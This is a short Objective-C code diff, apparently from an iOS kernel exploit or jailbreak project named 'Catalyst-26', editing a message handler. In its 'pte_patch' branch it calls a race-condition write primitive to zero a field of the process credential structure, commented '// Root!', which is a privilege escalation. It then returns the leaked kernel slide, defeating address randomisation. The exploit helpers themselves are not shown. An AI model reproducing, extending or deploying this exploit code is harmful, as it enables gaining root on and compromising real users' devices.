@@ -67,10 +67,11 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
     
     NSString *action = message.body[@"action"];
     if ([action isEqualToString:@"test_bridge"]) {
-        replyHandler(@{@"info": @"Catalyst-26 Ativo (A13)"}, nil);
+        replyHandler(@{@"status": @"SUCCESS", @"info": @"Catalyst-26 Active"}, nil);
     } else if ([action isEqualToString:@"pte_patch"]) {
         uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0];
+        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Root!
+        
         uint64_t slide = [self getKernelSlide];
         replyHandler(@{@"status": @"SUCCESS", @"slide": [NSString stringWithFormat:@"0x%llx", slide]}, nil);
         
